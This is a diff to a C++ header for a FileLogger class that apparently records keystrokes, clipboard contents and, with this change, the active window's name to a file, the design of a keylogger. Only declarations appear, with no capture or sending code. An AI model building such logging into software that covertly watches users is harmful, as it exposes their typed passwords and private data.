@@ -13,6 +13,12 @@ class FileLogger : public ILogger {
     bool open(std::string filename);
     bool open(IKeycodeMapper* mapper, std::string filename);
     bool open(IKeycodeMapper* mapper, IClipboardHandler* clipboardHandler, std::string filename);
+    bool open(
+        IKeycodeMapper* mapper,
+        IClipboardHandler* clipboardHandler,
+        IWindowHandler* windowHandler,
+        std::string filename
+    );
     void close();
 
     void logKeycode(int keycode, KeyState state);
@@ -20,12 +26,14 @@ class FileLogger : public ILogger {
  private:
     IKeycodeMapper* _mapper;
     IClipboardHandler* _clipboard;
+    IWindowHandler* _window;
     std::ofstream _stream;
 
     bool _modifierCtrl;
     bool _modifierShift;
 
     std::time_t _lastKeystroke;
+    std::string _lastWindow;
 };
 
 }
